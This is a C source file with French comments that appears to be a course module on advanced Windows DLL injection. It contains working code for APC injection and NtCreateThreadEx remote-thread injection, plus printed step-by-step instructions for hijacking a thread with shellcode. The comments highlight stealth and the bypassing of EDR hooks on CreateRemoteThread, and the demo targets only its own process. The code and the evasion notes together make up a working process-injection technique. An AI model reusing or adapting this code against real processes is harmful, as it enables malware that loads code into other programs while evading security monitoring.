/*
 * OBJECTIF  : Techniques avancees d'injection DLL (APC, Thread Hijacking)
 * PREREQUIS : Module 01-DLL-Injection-Basics, API Windows (threads, memoire)
 * COMPILE   : cl example.c /Fe:example.exe /link kernel32.lib
 *
 * Au-dela de CreateRemoteThread+LoadLibrary, il existe des methodes
 * plus furtives pour injecter une DLL dans un processus cible :
 * - QueueUserAPC : execute du code quand un thread entre en etat alertable
 * - Thread Hijacking : detourne le contexte d'un thread existant
 * - NtCreateThreadEx : version native, bypass hooks sur CreateRemoteThread
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

/* Trouver le premier thread d'un processus */
DWORD find_thread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                CloseHandle(snap);
                return te.th32ThreadID;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return 0;
}

/* Methode 1 : Injection via QueueUserAPC */
void demo_apc_injection(DWORD pid, const char* dll_path) {
    printf("[1] Injection via QueueUserAPC\n\n");

    printf("    [*] Principe : QueueUserAPC ajoute une procedure APC\n");
    printf("    [*] a un thread. Elle s'execute quand le thread appelle\n");
    printf("    [*] SleepEx, WaitForSingleObjectEx, etc. (etat alertable)\n\n");

    /* Ouvrir le processus cible */
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("    [-] OpenProcess echoue (err %lu)\n", GetLastError());
        return;
    }

    /* Ecrire le chemin de la DLL dans le processus cible */
    SIZE_T path_len = strlen(dll_path) + 1;
    LPVOID remote_buf = VirtualAllocEx(hProcess, NULL, path_len,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remote_buf, dll_path, path_len, NULL);
    printf("    [+] Chemin DLL ecrit a : %p\n", remote_buf);

    /* Obtenir l'adresse de LoadLibraryA */
    FARPROC pLoadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    /* Trouver un thread du processus cible */
    DWORD tid = find_thread(pid);
    if (tid == 0) {
        printf("    [-] Aucun thread trouve\n");
        VirtualFreeEx(hProcess, remote_buf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
    if (hThread) {
        /* Ajouter l'APC au thread */
        DWORD result = QueueUserAPC((PAPCFUNC)pLoadLib, hThread, (ULONG_PTR)remote_buf);
        if (result)
            printf("    [+] APC queue sur thread %lu\n", tid);
        else
            printf("    [-] QueueUserAPC echoue (err %lu)\n", GetLastError());
        CloseHandle(hThread);
    }

    printf("    [!] L'APC s'executera quand le thread entrera en etat alertable\n");
    printf("    [!] Detection : plus furtif que CreateRemoteThread\n\n");

    VirtualFreeEx(hProcess, remote_buf, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

/* Methode 2 : Thread Hijacking (SetThreadContext) */
void demo_thread_hijacking_concept(void) {
    printf("[2] Thread Hijacking (concept)\n\n");

    printf("    Principe :\n");
    printf("    1. SuspendThread(hThread)        -> suspendre le thread cible\n");
    printf("    2. GetThreadContext(hThread, &ctx) -> sauver les registres\n");
    printf("    3. Ecrire un shellcode dans le processus cible\n");
    printf("    4. ctx.Rip = shellcode_addr       -> rediriger l'execution\n");
    printf("    5. SetThreadContext(hThread, &ctx) -> appliquer le nouveau contexte\n");
    printf("    6. ResumeThread(hThread)          -> reprendre l'execution\n\n");
    printf("    Le shellcode doit :\n");
    printf("    - Sauvegarder les registres (pushad/pushfq)\n");
    printf("    - Appeler LoadLibrary(dll_path)\n");
    printf("    - Restaurer les registres\n");
    printf("    - Sauter a l'ancien RIP (reprendre le code original)\n\n");
    printf("    [!] Avantage : aucun thread cree, aucun APC\n");
    printf("    [!] Detection : Sysmon Event ID 10 (thread context modified)\n\n");
}

/* Methode 3 : NtCreateThreadEx (Native API) */
void demo_ntcreatethreadex(DWORD pid, const char* dll_path) {
    printf("[3] Injection via NtCreateThreadEx\n\n");

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx =
        (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");

    if (!NtCreateThreadEx) {
        printf("    [-] NtCreateThreadEx non trouvee\n");
        return;
    }

    printf("    [+] NtCreateThreadEx @ %p\n", NtCreateThreadEx);
    printf("    [*] Avantages vs CreateRemoteThread :\n");
    printf("        - Bypass hooks EDR sur kernel32!CreateRemoteThread\n");
    printf("        - Plus de controle sur les flags de creation\n");
    printf("        - Peut creer des threads suspendus avec THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER\n\n");

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("    [-] OpenProcess echoue\n");
        return;
    }

    /* Ecrire le chemin DLL */
    SIZE_T len = strlen(dll_path) + 1;
    LPVOID remote = VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remote, dll_path, len, NULL);

    FARPROC pLoadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    /* Creer le thread via NtCreateThreadEx */
    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (PVOID)pLoadLib,
        remote,
        0,    /* flags (0 = normal, 4 = hide from debugger) */
        0, 0, 0, NULL);

    if (NT_SUCCESS(status)) {
        printf("    [+] Thread cree via NtCreateThreadEx : %p\n", hThread);
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
    } else {
        printf("    [-] NtCreateThreadEx echoue : 0x%08lX\n", status);
    }

    VirtualFreeEx(hProcess, remote, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    printf("\n");
}

int main(void) {
    printf("[*] Demo : DLL Injection Avancee\n");
    printf("[*] ==========================================\n\n");

    /* Pour la demo, on utilise notre propre PID (safe) */
    DWORD pid = GetCurrentProcessId();
    printf("[*] PID cible (self) : %lu\n\n", pid);

    /* Chemin fictif pour la demo (la DLL n'a pas besoin d'exister pour montrer la technique) */
    const char* dll_path = "C:\\Windows\\System32\\version.dll";

    demo_apc_injection(pid, dll_path);
    demo_thread_hijacking_concept();
    demo_ntcreatethreadex(pid, dll_path);

    printf("[+] Exemple termine avec succes\n");
    return 0;
}
